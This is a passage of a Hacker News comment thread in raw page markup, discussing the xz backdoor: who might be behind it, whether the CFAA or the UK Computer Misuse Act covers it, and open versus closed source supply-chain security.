govt.</div><br/><div id="39879885" class="c"><input type="checkbox" id="c-39879885" checked=""/><div class="controls bullet"><span class="by">dboreham</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879340">parent</a><span>|</span><a href="#39881520">next</a><span>|</span><label class="collapse" for="c-39879885">[-]</label><label class="expand" for="c-39879885">[2 more]</label></div><br/><div class="children"><div class="content">To me it seems too clumsy to be USG. They seem to prefer back doors that are undetectable or hide in plain sight.<p>But it might be an NSA op designed to instigate a much needed serious examination of the supply chain.</div><br/><div id="39880429" class="c"><input type="checkbox" id="c-39880429" checked=""/><div class="controls bullet"><span class="by">dannyw</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879885">parent</a><span>|</span><a href="#39881520">next</a><span>|</span><label class="collapse" for="c-39880429">[-]</label><label class="expand" for="c-39880429">[1 more]</label></div><br/><div class="children"><div class="content">Remember how bad, slow, and obvious Dual_EC_DRNG was?</div><br/></div></div></div></div><div id="39881520" class="c"><input type="checkbox" id="c-39881520" checked=""/><div class="controls bullet"><span class="by">Muromec</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879340">parent</a><span>|</span><a href="#39879885">prev</a><span>|</span><a href="#39879407">next</a><span>|</span><label class="collapse" for="c-39881520">[-]</label><label class="expand" for="c-39881520">[2 more]</label></div><br/><div class="children"><div class="content">Overcomplicated design, sloppy opsec and Eastern European time zone altogether sound more like an attempt to snatch some bitcoins by a small group of people in places.</div><br/><div id="39882029" class="c"><input type="checkbox" id="c-39882029" checked=""/><div class="controls bullet"><span class="by">numpad0</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39881520">parent</a><span>|</span><a href="#39879407">next</a><span>|</span><label class="collapse" for="c-39882029">[-]</label><label class="expand" for="c-39882029">[1 more]</label></div><br/><div class="children"><div class="content">I wonder what had happened in Eastern Europe ~2 years ago...</div><br/></div></div></div></div><div id="39879407" class="c"><input type="checkbox" id="c-39879407" checked=""/><div class="controls bullet"><span class="by">tejohnso</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879340">parent</a><span>|</span><a href="#39881520">prev</a><span>|</span><a href="#39879220">next</a><span>|</span><label class="collapse" for="c-39879407">[-]</label><label class="expand" for="c-39879407">[4 more]</label></div><br/><div class="children"><div class="content">&gt; possible even some arm of the U.S. govt.<p>Possible. But why mention U.S. specifically? Is it more likely than Russia, Iran, China, France ... ?</div><br/><div id="39879463" class="c"><input type="checkbox" id="c-39879463" checked=""/><div class="controls bullet"><span class="by">pcthrowaway</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879407">parent</a><span>|</span><a href="#39879425">next</a><span>|</span><label class="collapse" for="c-39879463">[-]</label><label class="expand" for="c-39879463">[1 more]</label></div><br/><div class="children"><div class="content">&gt; This individual&#x2F;organization needs to be on the top of every country&#x27;s most wanted lists<p>Because if the &quot;organization&quot; is a U.S. agency, not much is going to happen here. Russia or China or North Korea might make some strongly worded statements, but nothing is going to happen.<p>It&#x27;s also very possible that security researchers won&#x27;t be able to find out, and government agencies will finger-point as a means of misdirection.<p>For example, a statement comes out in a month that this was North Korea. Was it really? Or are they just a convenient scapegoat so the NSA doesn&#x27;t have to play defense on its lack of accountability again?</div><br/></div></div><div id="39879425" class="c"><input type="checkbox" id="c-39879425" checked=""/><div class="controls bullet"><span class="by">mardifoufs</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879407">parent</a><span>|</span><a href="#39879463">prev</a><span>|</span><a href="#39879220">next</a><span>|</span><label class="collapse" for="c-39879425">[-]</label><label class="expand" for="c-39879425">[2 more]</label></div><br/><div class="children"><div class="content">The US is behind more documented backdoors than those other countries.</div><br/><div id="39880135" class="c"><input type="checkbox" id="c-39880135" checked=""/><div class="controls bullet"><span class="by">EasyMark</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879425">parent</a><span>|</span><a href="#39879220">next</a><span>|</span><label class="collapse" for="c-39880135">[-]</label><label class="expand" for="c-39880135">[1 more]</label></div><br/><div class="children"><div class="content">Highly likely, China has been estimated to have cyberhacking resources that are 10-50x what the USA has currently. It&#x27;s not even close. The USA will have to up it&#x27;s game soon or accept China being able to shut down large swathes of the grid and critical infrastructure at will</div><br/></div></div></div></div></div></div></div></div><div id="39879220" class="c"><input type="checkbox" id="c-39879220" checked=""/><div class="controls bullet"><span class="by">tootie</span><span>|</span><a href="#39878188">parent</a><span>|</span><a href="#39879340">prev</a><span>|</span><a href="#39879701">next</a><span>|</span><label class="collapse" for="c-39879220">[-]</label><label class="expand" for="c-39879220">[3 more]</label></div><br/><div class="children"><div class="content">CISA had a report on this pretty quickly. I think they refer cases to Secret Service for enforcement. But really, we seemingly have no idea who or where the perpetrator is located. This could easily be a state actor. It could be a lone wolf. And the effects of the attack would be global too, so jurisdiction is tricky. We really have no idea at this point. The personas used to push the commits and push for inclusion were almost certainly fronts. I&#x27;m sure github is sifting through a slew of subpoenas right now.</div><br/><div id="39880286" class="c"><input type="checkbox" id="c-39880286" checked=""/><div class="controls bullet"><span class="by">grepfru_it</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879220">parent</a><span>|</span><a href="#39879701">next</a><span>|</span><label class="collapse" for="c-39880286">[-]</label><label class="expand" for="c-39880286">[2 more]</label></div><br/><div class="children"><div class="content">github retains an incredible amount of data to review. but if it is a state actor, they likely covered their tracks very well.  when i found the original address of the person who hacked elon musk&#x27;s twitter account it led to an amazon ec2 instance. that instance was bought with stolen financial information and accessed via several vpns and proxies.  i would expect state actors to further obfuscate their tracks with shell companies and the like</div><br/><div id="39880652" class="c"><input type="checkbox" id="c-39880652" checked=""/><div class="controls bullet"><span class="by">Randalthorro</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39880286">parent</a><span>|</span><a href="#39879701">next</a><span>|</span><label class="collapse" for="c-39880652">[-]</label><label class="expand" for="c-39880652">[1 more]</label></div><br/><div class="children"><div class="content">State actors get to invent people. Literally.</div><br/></div></div></div></div></div></div><div id="39879701" class="c"><input type="checkbox" id="c-39879701" checked=""/><div class="controls bullet"><span class="by">lulznews</span><span>|</span><a href="#39878188">parent</a><span>|</span><a href="#39879220">prev</a><span>|</span><a href="#39878201">next</a><span>|</span><label class="collapse" for="c-39879701">[-]</label><label class="expand" for="c-39879701">[1 more]</label></div><br/><div class="children"><div class="content">Lmao it’s a state actor bro</div><br/></div></div><div id="39878227" class="c"><input type="checkbox" id="c-39878227" checked=""/><div class="controls bullet"><span class="by">greyface-</span><span>|</span><a href="#39878188">parent</a><span>|</span><a href="#39878810">prev</a><span>|</span><a href="#39879487">next</a><span>|</span><label class="collapse" for="c-39878227">[-]</label><label class="expand" for="c-39878227">[39 more]</label></div><br/><div class="children"><div class="content">I understand the impulse to seek justice, but what crime have they committed?  It&#x27;s illegal to gain unauthorized access, but not to write vulnerable code.  Is there evidence that this is being exploited in the wild?</div><br/><div id="39878364" class="c"><input type="checkbox" id="c-39878364" checked=""/><div class="controls bullet"><span class="by">jmward01</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878227">parent</a><span>|</span><a href="#39878969">next</a><span>|</span><label class="collapse" for="c-39878364">[-]</label><label class="expand" for="c-39878364">[24 more]</label></div><br/><div class="children"><div class="content">I am definitely not a lawyer so I have no claim to knowing what is or is not a crime. However, if backdooring SSH on a potentially wide scale doesn&#x27;t trip afoul of laws then we need to seriously have a discussion about the modern world. I&#x27;d argue that investigating this as a crime is likely in the best interest of public safety and even (I hesitate to say this) national security considering the potential scale of this. Finally, I would say there is a distinction between writing vulnerable code and creating a backdoor with malicious intent. It appears (from the articles I have been reading so far) that this was malicious, not an accident or lack of skill. We will see over the next few days though as more experts get eyes on this.</div><br/><div id="39878464" class="c"><input type="checkbox" id="c-39878464" checked=""/><div class="controls bullet"><span class="by">greyface-</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878364">parent</a><span>|</span><a href="#39880011">next</a><span>|</span><label class="collapse" for="c-39878464">[-]</label><label class="expand" for="c-39878464">[22 more]</label></div><br/><div class="children"><div class="content">Agreed on a moral level, and it&#x27;s true that describing this as simply &quot;vulnerable code&quot; doesn&#x27;t capture the clear malicious intent.  I&#x27;m just struggling to find a specific crime.  CFAA requires unauthorized access to occur, but the attacker was authorized to publish changes to xz.  Code is speech.  It was distributed with a &quot;no warranty&quot; clause in the license.</div><br/><div id="39878962" class="c"><input type="checkbox" id="c-39878962" checked=""/><div class="controls bullet"><span class="by">semiquaver</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878464">parent</a><span>|</span><a href="#39878578">next</a><span>|</span><label class="collapse" for="c-39878962">[-]</label><label class="expand" for="c-39878962">[6 more]</label></div><br/><div class="children"><div class="content">CFAA covers this.  Its a crime to<p><pre><code>  &gt; knowingly [cause] the transmission of a program, information, code, or command, and as a result of such conduct, intentionally causes damage without authorization, to a protected computer;
</code></pre>
Where one of the definitions of “protected computer” is one that is used in interstate commerce, which covers effectively all of them.</div><br/><div id="39879389" class="c"><input type="checkbox" id="c-39879389" checked=""/><div class="controls bullet"><span class="by">pbhjpbhj</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878962">parent</a><span>|</span><a href="#39878578">next</a><span>|</span><label class="collapse" for="c-39879389">[-]</label><label class="expand" for="c-39879389">[5 more]</label></div><br/><div class="children"><div class="content">It seems like the backdoor creates the potential to &quot;cause damage&quot; but doesn&#x27;t [provably?] cause damage <i>per se</i>?<p>The author of the backdoor doesn&#x27;t themselves &quot;[cause] the transmission of a program ...&quot;. Others do the transmission.<p>Seems weak, unless you know of some precedent case(s)?</div><br/><div id="39879637" class="c"><input type="checkbox" id="c-39879637" checked=""/><div class="controls bullet"><span class="by">whartung</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879389">parent</a><span>|</span><a href="#39880026">next</a><span>|</span><label class="collapse" for="c-39879637">[-]</label><label class="expand" for="c-39879637">[1 more]</label></div><br/><div class="children"><div class="content">The back door is damage. The resulting sshd is like a door with a broken lock. This patch breaks the lock. Transmitting the patch caused intentional damage.</div><br/></div></div><div id="39880026" class="c"><input type="checkbox" id="c-39880026" checked=""/><div class="controls bullet"><span class="by">semiquaver</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879389">parent</a><span>|</span><a href="#39879637">prev</a><span>|</span><a href="#39880115">next</a><span>|</span><label class="collapse" for="c-39880026">[-]</label><label class="expand" for="c-39880026">[2 more]</label></div><br/><div class="children"><div class="content">The malicious author caused the transmission of the release tarball to GitHub and the official project site. This act was intentional and as a direct result other computers were damaged (when their administrators unknowingly installed the backdoored library).<p>You’ve got to be joking if you’re saying that this wouldn’t be an open and shut case to prosecute. It’s directly on point. Law isn’t code, any jury would have zero trouble convicting on these facts.</div><br/><div id="39880125" class="c"><input type="checkbox" id="c-39880125" checked=""/><div class="controls bullet"><span class="by">refulgentis</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39880026">parent</a><span>|</span><a href="#39880115">next</a><span>|</span><label class="collapse" for="c-39880125">[-]</label><label class="expand" for="c-39880125">[1 more]</label></div><br/><div class="children"><div class="content">Hello fellow &quot;law isn&#x27;t code&quot; traveller. (my least favorite engineer habit!)</div><br/></div></div></div></div><div id="39880115" class="c"><input type="checkbox" id="c-39880115" checked=""/><div class="controls bullet"><span class="by">refulgentis</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879389">parent</a><span>|</span><a href="#39880026">prev</a><span>|</span><a href="#39878578">next</a><span>|</span><label class="collapse" for="c-39880115">[-]</label><label class="expand" for="c-39880115">[1 more]</label></div><br/><div class="children"><div class="content">Law isn&#x27;t code. If someone finds precedent, there will be a way to argue it doesn&#x27;t cover this specific scenario. They call this conversational process &quot;hypos&quot; in law school, and this fundamental truth is why you never hear of a lawyer being stumped as to how to defend a client.<p>Ultimately, the CFAA will get it done if it gets that far, armchair lawyering aside.<p>To pressure test this fully, since this can be caricatured as &quot;we can punish degenerate behavior as needed&quot;, which isn&#x27;t necessarily great: it&#x27;s also why there&#x27;s a thin line between a authoritarian puppet judiciary and a fair one.</div><br/></div></div></div></div></div></div><div id="39878578" class="c"><input type="checkbox" id="c-39878578" checked=""/><div class="controls bullet"><span class="by">stephc_int13</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878464">parent</a><span>|</span><a href="#39878962">prev</a><span>|</span><a href="#39878626">next</a><span>|</span><label class="collapse" for="c-39878578">[-]</label><label class="expand" for="c-39878578">[1 more]</label></div><br/><div class="children"><div class="content">It is like opening the door of a safe and letting someone else rob the money inside.<p>This is way beyond &quot;moral level&quot;.</div><br/></div></div><div id="39878562" class="c"><input type="checkbox" id="c-39878562" checked=""/><div class="controls bullet"><span class="by">fragmede</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878464">parent</a><span>|</span><a href="#39878626">prev</a><span>|</span><a href="#39878582">next</a><span>|</span><label class="collapse" for="c-39878562">[-]</label><label class="expand" for="c-39878562">[4 more]</label></div><br/><div class="children"><div class="content">CFAA covers distribution of malicious software without the owners consent, the Wire Fraud Act covers malware distribution schemes intended to defraud for property, Computer Misuse act in the UK is broad and far reaching like the CFAA, so this likely fall afoul of that. The GDPR protects personal data, so there&#x27;s possibly a case that could be made that this violates that as well, though that might be a bit of reach.</div><br/><div id="39879355" class="c"><input type="checkbox" id="c-39879355" checked=""/><div class="controls bullet"><span class="by">javajosh</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878562">parent</a><span>|</span><a href="#39878582">next</a><span>|</span><label class="collapse" for="c-39879355">[-]</label><label class="expand" for="c-39879355">[3 more]</label></div><br/><div class="children"><div class="content">In which case the defense will claim, correctly, that this malware was never distributed. It was caught. &quot;Attempted malware distribution&quot; may not actually be a crime (but IANAL so I don&#x27;t know).</div><br/><div id="39879696" class="c"><input type="checkbox" id="c-39879696" checked=""/><div class="controls bullet"><span class="by">timschmidt</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879355">parent</a><span>|</span><a href="#39880709">next</a><span>|</span><label class="collapse" for="c-39879696">[-]</label><label class="expand" for="c-39879696">[1 more]</label></div><br/><div class="children"><div class="content">Folks who run Debian SID or Fedora testing may disagree.</div><br/></div></div></div></div></div></div><div id="39878582" class="c"><input type="checkbox" id="c-39878582" checked=""/><div class="controls bullet"><span class="by">ndriscoll</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878464">parent</a><span>|</span><a href="#39878562">prev</a><span>|</span><a href="#39880011">next</a><span>|</span><label class="collapse" for="c-39878582">[-]</label><label class="expand" for="c-39878582">[9 more]</label></div><br/><div class="children"><div class="content">If more than one person was involved, it&#x27;d presumably fall under criminal conspiracy. Clearly this was an overt act in furtherance of a crime (unauthorized access under CFAA, at the least).</div><br/><div id="39878720" class="c"><input type="checkbox" id="c-39878720" checked=""/><div class="controls bullet"><span class="by">sneak</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878582">parent</a><span>|</span><a href="#39880011">next</a><span>|</span><label class="collapse" for="c-39878720">[-]</label><label class="expand" for="c-39878720">[8 more]</label></div><br/><div class="children"><div class="content">The criminal conspiracy laws don’t apply to the organizations that write this kind of code, just like murder laws don’t.</div><br/><div id="39878751" class="c"><input type="checkbox" id="c-39878751" checked=""/><div class="controls bullet"><span class="by">ceejayoz</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878720">parent</a><span>|</span><a href="#39880011">next</a><span>|</span><label class="collapse" for="c-39878751">[-]</label><label class="expand" for="c-39878751">[7 more]</label></div><br/><div class="children"><div class="content">Sure they do. Getting the perpetrator into your jurisdiction is the tough part.<p>Putin is, for example, unlikely to go anywhere willing to execute an ICC arrest warrant.</div><br/><div id="39878791" class="c"><input type="checkbox" id="c-39878791" checked=""/><div class="controls bullet"><span class="by">sneak</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878751">parent</a><span>|</span><a href="#39880011">next</a><span>|</span><label class="collapse" for="c-39878791">[-]</label><label class="expand" for="c-39878791">[6 more]</label></div><br/><div class="children"><div class="content">Nah, the CIA assassinates people in MLAT zones all the time.  The laws that apply to you and I don’t apply to the privileged operators of the state’s prerogatives.<p>We don’t even know that this specific backdoor wasn’t the NSA or CIA. Assuming it was a foreign intelligence service because the fake name was asian-sounding is a bit silly.  The people who wrote this code might be sitting in Virginia or Maryland already.</div><br/><div id="39879010" class="c"><input type="checkbox" id="c-39879010" checked=""/><div class="controls bullet"><span class="by">tomoyoirl</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878791">parent</a><span>|</span><a href="#39878932">next</a><span>|</span><label class="collapse" for="c-39879010">[-]</label><label class="expand" for="c-39879010">[3 more]</label></div><br/><div class="children"><div class="content">&gt; Virginia or Maryland<p>Eastern Europe, suggest the timestamp &#x2F; holiday analysts. <a href="https:&#x2F;&#x2F;rheaeve.substack.com&#x2F;p&#x2F;xz-backdoor-times-damned-times-and" rel="nofollow">https:&#x2F;&#x2F;rheaeve.substack.com&#x2F;p&#x2F;xz-backdoor-times-damned-time...</a></div><br/><div id="39882390" class="c"><input type="checkbox" id="c-39882390" checked=""/><div class="controls bullet"><span class="by">daurentius523</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879010">parent</a><span>|</span><a href="#39879602">next</a><span>|</span><label class="collapse" for="c-39882390">[-]</label><label class="expand" for="c-39882390">[1 more]</label></div><br/><div class="children"><div class="content">Eastern Europe - 25th? Not 24th?</div><br/></div></div><div id="39879602" class="c"><input type="checkbox" id="c-39879602" checked=""/><div class="controls bullet"><span class="by">WesolyKubeczek</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879010">parent</a><span>|</span><a href="#39882390">prev</a><span>|</span><a href="#39878932">next</a><span>|</span><label class="collapse" for="c-39879602">[-]</label><label class="expand" for="c-39879602">[1 more]</label></div><br/><div class="children"><div class="content">Note that while “Eastern Europe” has firm connotations with countries of which some are known for having corrupt autocracies, booming shady businesses, and organized crime and cybercrime gangs in varying proportions, the time zone mentioned also covers Finland, from which the other author is supposed to be.</div><br/></div></div></div></div><div id="39878932" class="c"><input type="checkbox" id="c-39878932" checked=""/><div class="controls bullet"><span class="by">ceejayoz</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878791">parent</a><span>|</span><a href="#39879010">prev</a><span>|</span><a href="#39880011">next</a><span>|</span><label class="collapse" for="c-39878932">[-]</label><label class="expand" for="c-39878932">[2 more]</label></div><br/><div class="children"><div class="content">&gt; The people who wrote this code might be sitting in Virginia or Maryland already.<p>Sure, that’s possible. They will as a result probably avoid traveling to unfriendly jurisdictions without a diplomatic passport.</div><br/><div id="39879371" class="c"><input type="checkbox" id="c-39879371" checked=""/><div class="controls bullet"><span class="by">rl3</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878932">parent</a><span>|</span><a href="#39880011">next</a><span>|</span><label class="collapse" for="c-39879371">[-]</label><label class="expand" for="c-39879371">[1 more]</label></div><br/><div class="children"><div class="content">&gt;<i>They will as a result probably avoid traveling to unfriendly jurisdictions without a diplomatic passport.</i><p>First of all, it&#x27;s not like their individual identities would ever be known.<p>Second, they would already know that traveling to a hostile country is a great way to catch bullshit espionage charges, maybe end up tortured, and certainly be used as a political pawn.<p>Third, this is too sloppy to have originated from there anyways—however clever it was.</div><br/></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div id="39880011" class="c"><input type="checkbox" id="c-39880011" checked=""/><div class="controls bullet"><span class="by">bee_rider</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878364">parent</a><span>|</span><a href="#39878464">prev</a><span>|</span><a href="#39878969">next</a><span>|</span><label class="collapse" for="c-39880011">[-]</label><label class="expand" for="c-39880011">[1 more]</label></div><br/><div class="children"><div class="content">Laws don’t fix technical issues any more than they fix physical ones. Clearly this was possible, so it could be done by a foreign intelligence agency or well-hidden criminal organization.<p>I think this is probably illegal. But, I think we should not punish this sort of thing too harshly. Tech is an ecosystem. Organizations need to evolve to protect themselves. Instead, we should make companies liable for the damage that happens when they are hit by one of these attacks.<p>Before anyone calls it out: yes, this will be blaming the victim. But, companies aren’t people, and so we don’t really need to worry about the psychological damage that victim blaming would do, in their case. They are systems, that respond to incentives, and we should provide the incentives to make them tough.</div><br/></div></div></div></div><div id="39878969" class="c"><input type="checkbox" id="c-39878969" checked=""/><div class="controls bullet"><span class="by">hnarn</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878227">parent</a><span>|</span><a href="#39878364">prev</a><span>|</span><a href="#39878559">next</a><span>|</span><label class="collapse" for="c-39878969">[-]</label><label class="expand" for="c-39878969">[4 more]</label></div><br/><div class="children"><div class="content">What is constantly overlooked here on HN is that in legal terms, one of the most important things is <i>intent</i>. Commenters on HN always approach legal issues from a technical perspective but that is simply not how the judicial system works. Whether something is “technically X” or not is irrelevant, laws are usually written with the purpose of catching people based on their intent (malicious hacking), not merely on the technicalities (pentesters distributing examples).</div><br/><div id="39879247" class="c"><input type="checkbox" id="c-39879247" checked=""/><div class="controls bullet"><span class="by">drowsspa</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878969">parent</a><span>|</span><a href="#39878559">next</a><span>|</span><label class="collapse" for="c-39879247">[-]</label><label class="expand" for="c-39879247">[3 more]</label></div><br/><div class="children"><div class="content">Yeah, it bothers me so much. They really seem to think that &quot;law is code&quot;.</div><br/><div id="39880499" class="c"><input type="checkbox" id="c-39880499" checked=""/><div class="controls bullet"><span class="by">golergka</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39879247">parent</a><span>|</span><a href="#39879721">next</a><span>|</span><label class="collapse" for="c-39880499">[-]</label><label class="expand" for="c-39880499">[1 more]</label></div><br/><div class="children"><div class="content">It is code, but it runs on human wetware which can decode input about actual events into output about intent, and reach consensus about this output via proper court procedures.</div><br/></div></div></div></div></div></div><div id="39878559" class="c"><input type="checkbox" id="c-39878559" checked=""/><div class="controls bullet"><span class="by">stephc_int13</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878227">parent</a><span>|</span><a href="#39878969">prev</a><span>|</span><a href="#39878406">next</a><span>|</span><label class="collapse" for="c-39878559">[-]</label><label class="expand" for="c-39878559">[1 more]</label></div><br/><div class="children"><div class="content">Calling this backdoor &quot;vulnerable code&quot; is a gross mischaracterization.<p>This is closer to a large scale trojan horse, that does not have to be randomly discovered by a hacker to be exploited, but is readily available for privileged remote code execution by whoever have the private key to access this backdoor.</div><br/></div></div><div id="39878406" class="c"><input type="checkbox" id="c-39878406" checked=""/><div class="controls bullet"><span class="by">ronsor</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878227">parent</a><span>|</span><a href="#39878559">prev</a><span>|</span><a href="#39878510">next</a><span>|</span><label class="collapse" for="c-39878406">[-]</label><label class="expand" for="c-39878406">[5 more]</label></div><br/><div class="children"><div class="content">It&#x27;s not simply vulnerable code: it&#x27;s an actual backdoor. That is malware distribution (without permission) and is therefore illegal.</div><br/><div id="39878517" class="c"><input type="checkbox" id="c-39878517" checked=""/><div class="controls bullet"><span class="by">greyface-</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878406">parent</a><span>|</span><a href="#39878510">next</a><span>|</span><label class="collapse" for="c-39878517">[-]</label><label class="expand" for="c-39878517">[4 more]</label></div><br/><div class="children"><div class="content">Is it illegal to distribute malware?  I see security researchers doing it all the time for analysis purposes.</div><br/><div id="39878547" class="c"><input type="checkbox" id="c-39878547" checked=""/><div class="controls bullet"><span class="by">ronsor</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878517">parent</a><span>|</span><a href="#39878576">next</a><span>|</span><label class="collapse" for="c-39878547">[-]</label><label class="expand" for="c-39878547">[2 more]</label></div><br/><div class="children"><div class="content">No, it is not illegal to distribute malware by itself, but it is illegal to trick people into installing malware. The latter was the goal of the XZ contributor.</div><br/><div id="39879437" class="c"><input type="checkbox" id="c-39879437" checked=""/><div class="controls bullet"><span class="by">pbhjpbhj</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878547">parent</a><span>|</span><a href="#39878576">next</a><span>|</span><label class="collapse" for="c-39879437">[-]</label><label class="expand" for="c-39879437">[1 more]</label></div><br/><div class="children"><div class="content">I assume you&#x27;re talking from a USC perspective? Can you say which specific law, chapter, and clause applies?</div><br/></div></div></div></div><div id="39878576" class="c"><input type="checkbox" id="c-39878576" checked=""/><div class="controls bullet"><span class="by">fragmede</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878517">parent</a><span>|</span><a href="#39878547">prev</a><span>|</span><a href="#39878510">next</a><span>|</span><label class="collapse" for="c-39878576">[-]</label><label class="expand" for="c-39878576">[1 more]</label></div><br/><div class="children"><div class="content">specifically, thevCFAA covers distribution of malicious software without the owners consent. Security researchs downloading malware implicitly give consent to be downloading malware marked as such.</div><br/></div></div></div></div></div></div><div id="39878510" class="c"><input type="checkbox" id="c-39878510" checked=""/><div class="controls bullet"><span class="by">M2Ys4U</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878227">parent</a><span>|</span><a href="#39878406">prev</a><span>|</span><a href="#39879584">next</a><span>|</span><label class="collapse" for="c-39878510">[-]</label><label class="expand" for="c-39878510">[1 more]</label></div><br/><div class="children"><div class="content">In the UK, at least, unauthorised access to computer material under section 1 of the Computer Misuse Act 1990 - and I would also assume that it would also fall foul of sections 2 (&quot;Unauthorised access with intent to commit or facilitate commission of further offences&quot;) and 3A (&quot;Making, supplying or obtaining articles for use in offence under section 1, 3 or 3ZA&quot;) as well.<p>Though proving jurisdiction would be tricky...</div><br/></div></div><div id="39879584" class="c"><input type="checkbox" id="c-39879584" checked=""/><div class="controls bullet"><span class="by">kmeisthax</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878227">parent</a><span>|</span><a href="#39878510">prev</a><span>|</span><a href="#39878689">next</a><span>|</span><label class="collapse" for="c-39879584">[-]</label><label class="expand" for="c-39879584">[1 more]</label></div><br/><div class="children"><div class="content">If CFAA doesn&#x27;t get this guy behind bars then the CFAA is somehow even worse. Not only is it an overbroad and confusing law, it&#x27;s also not broad enough to actually handcuff people who write malicious code.</div><br/></div></div><div id="39878689" class="c"><input type="checkbox" id="c-39878689" checked=""/><div class="controls bullet"><span class="by">Seattle3503</span><span>|</span><a href="#39878188">root</a><span>|</span><a href="#39878227">parent</a><span>|</span><a href="#39879584">prev</a><span>|</span><a href="#39878413">next</a><span>|</span><label class="collapse" for="c-39878689">[-]</label><label class="expand" for="c-39878689">[1 more]</label></div><br/><div class="children"><div class="content">I&#x27;d be surprised if the attacker didn&#x27;t meet the criteria for mens rea.</div><br/></div></div></div></div></div></div><div id="39879487" class="c"><input type="checkbox" id="c-39879487" checked=""/><div class="controls bullet"><span class="by">martinohansen</span><span>|</span><a href="#39878188">prev</a><span>|</span><a href="#39879090">next</a><span>|</span><label class="collapse" for="c-39879487">[-]</label><label class="expand" for="c-39879487">[28 more]</label></div><br/><div class="children"><div class="content">Imagine a future where state actors have hundreds of AI agents fixing bugs, gaining reputation while they slowly introduce backdoors. I really hope open source models succeed.</div><br/><div id="39880248" class="c"><input type="checkbox" id="c-39880248" checked=""/><div class="controls bullet"><span class="by">exitzer0</span><span>|</span><a href="#39879487">parent</a><span>|</span><a href="#39879546">next</a><span>|</span><label class="collapse" for="c-39880248">[-]</label><label class="expand" for="c-39880248">[3 more]</label></div><br/><div class="children"><div class="content">I work for a large closed-source software company and I can tell you with 100% that it is full of domestic and foreign agents.  Being open source means that more eyes can and will look at something.  That only increases the chance of malicious actions being found out ... just like this supply-chain attack.</div><br/><div id="39881038" class="c"><input type="checkbox" id="c-39881038" checked=""/><div class="controls bullet"><span class="by">naruhodo</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39880248">parent</a><span>|</span><a href="#39880447">next</a><span>|</span><label class="collapse" for="c-39881038">[-]</label><label class="expand" for="c-39881038">[1 more]</label></div><br/><div class="children"><div class="content">Reminds me of the scene in Fight Club where the unreliable narrator is discussing car defects to a fellow airline passenger.<p>Quoting from flawed memory:<p>Passenger: <i>Which company?</i><p>Narrator: <i>A large one.</i></div><br/></div></div></div></div><div id="39879546" class="c"><input type="checkbox" id="c-39879546" checked=""/><div class="controls bullet"><span class="by">legobmw99</span><span>|</span><a href="#39879487">parent</a><span>|</span><a href="#39880248">prev</a><span>|</span><a href="#39879543">next</a><span>|</span><label class="collapse" for="c-39879546">[-]</label><label class="expand" for="c-39879546">[11 more]</label></div><br/><div class="children"><div class="content">Why would open source models make this scenario you are painting better?</div><br/><div id="39879593" class="c"><input type="checkbox" id="c-39879593" checked=""/><div class="controls bullet"><span class="by">undersuit</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879546">parent</a><span>|</span><a href="#39879543">next</a><span>|</span><label class="collapse" for="c-39879593">[-]</label><label class="expand" for="c-39879593">[10 more]</label></div><br/><div class="children"><div class="content">Because in the closed source model the frustrated developer that looked into this SSH slowness submits a ticket for the owner of the malicious code to dismiss.</div><br/><div id="39879953" class="c"><input type="checkbox" id="c-39879953" checked=""/><div class="controls bullet"><span class="by">matrix_overload</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879593">parent</a><span>|</span><a href="#39879853">next</a><span>|</span><label class="collapse" for="c-39879953">[-]</label><label class="expand" for="c-39879953">[5 more]</label></div><br/><div class="children"><div class="content">Not necessarily. A frustrated developer posts about it, it catches attention of someone who knows how to use Ghidra et al, and it gets dug out quite fast.<p>Except, with closed-source software maintained by a for-profit company, suck cockup would mean a huge reputational hit, with billions of dollars of lost market cap. So, there are very high incentives for companies to vet their devs, have proper code reviews, etc.<p>But with open-source, anyone can be a contributor, everyone is a friend, and nobody is reliably real-world-identifiable. So, carrying out such attacks is easier by orders magnitude.</div><br/><div id="39880607" class="c"><input type="checkbox" 